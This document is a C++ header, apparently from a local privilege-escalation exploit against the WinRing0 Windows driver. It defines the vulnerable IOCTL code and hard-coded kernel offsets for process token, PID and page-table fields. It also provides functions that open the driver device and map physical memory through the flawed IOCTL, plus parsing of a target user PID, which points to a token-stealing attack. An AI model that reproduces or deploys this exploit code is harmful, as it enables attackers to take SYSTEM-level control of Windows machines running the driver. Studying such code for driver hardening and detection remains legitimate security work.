#pragma once
#include <windows.h>
#include <TlHelp32.h> 
#include <cstdint>
#include <vector>
#include <map>
#include <iostream>

// #### CONSTANTS ####

#define VULN_IOCTL				(UINT64)0x9C406104
#define OUT_BUFF_SIZE			0x8
#define BUFF_SIZE				(UINT64)0x1000

enum OFFSET
{
	UNIQUEPROCESSID = 0x440,	// check if the values of these are != 0
	TOKEN = 0x4b8,
	DIRECTORY_TABLE = 0x28,		// just gonna assume this is 0x1ad000, because I don't have time
	IMAGEFILENAME = 0x5a8,
};
		
#define DEVICE_NAME		"\\\\.\\WinRing0_1_2_0"

#define putchar(c) putc((c),stdout)

#pragma pack (push, 1)

struct MapIoCmd {
	DWORD64 address;
	DWORD chunk_size;
	DWORD chunk_num;
};
#pragma pack (pop)

HANDLE OpenDevice(const char* device_symbolic_link)
{
	HANDLE device_handle = INVALID_HANDLE_VALUE;

	device_handle = CreateFileA(device_symbolic_link,               // Device to open
		GENERIC_READ | GENERIC_WRITE,								// Request R/W access
		FILE_SHARE_READ | FILE_SHARE_WRITE,							// Allow other processes to R/W
		NULL,														// Default security attributes
		OPEN_EXISTING,												// Default disposition
		0,															// No flags/attributes
		NULL);														// Don't copy attributes

	if (device_handle == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device!\n");
	}

	return device_handle;
}

uint8_t* MapMemory(HANDLE device, MapIoCmd* input_buf)
{
	DWORD bytes_returned = 0;

	LPVOID out_buf = VirtualAlloc((LPVOID)0x42000000, BUFF_SIZE+0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	auto result = DeviceIoControl(
		device,
		VULN_IOCTL,
		input_buf,
		(DWORD)sizeof(MapIoCmd),
		out_buf,
		(DWORD)BUFF_SIZE+0x100,
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	if (!result)
	{
		std::cout << "IOCTL GetLastError " << GetLastError() << std::endl;
		VirtualFree(out_buf, BUFF_SIZE, MEM_RELEASE);
		return NULL;
	}

	return (uint8_t*)out_buf;
}

// ### OPTIONS PARSING ###

DWORDLONG get_user_pid_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-userPID") == 0 && i + 1 < argc)
		{
			return atoi(argv[i + 1]);
		}
	}
	return NULL;
}

DWORDLONG get_help_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "-help") == 0 || strcmp(argv[i], "--help") == 0)
		{
			return 1;
		}
	}
	return NULL;
}